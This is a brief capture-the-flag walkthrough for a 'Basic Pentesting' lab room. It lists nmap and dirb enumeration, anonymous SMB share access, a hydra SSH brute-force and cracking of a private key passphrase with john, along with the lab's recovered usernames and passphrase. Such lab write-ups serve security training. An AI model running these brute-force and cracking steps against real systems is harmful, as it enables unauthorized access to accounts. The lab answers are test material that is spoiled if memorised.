# Basic Pentesting

## port scan
```
nmap -sV -Pn -oN nmap.txt -v <ip-address>
```

* open port

```
22
80
445
138
```

```
dirb http://<ip-address> /usr/share/dirb/wordlists/small.txt
```

* open directory

```
http://<ip-address>/development/
```

* share folder

```
smbclient -L <ip-address>
```

Sharename `Anonymous`

* connect

```
smbclient \\\\<ip-address>\\Anonymous
```

* User Name

`Kay`:
`Jan`: `armando`

* password crak

```
hydra -l jan -P /usr/hsare/wordlists/rockyou.txt ssh:<ip-address> -t 4
```

* available PasswordAuthentication

```
ssh -o PasswordAuthentication=yes jan@<ip-address>
```

*

```
/usr/share/john/ssh2john.py kay_id_rsa > forjohn.txt
```

```
sudo /usr/sbin/john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

* id_rsa password

`beeswax`

* Advance

Nmap

```
https://tryhackme.com/r/room/furthernmap
```

Hydra

```
https://tryhackme.com/r/room/hydra
```

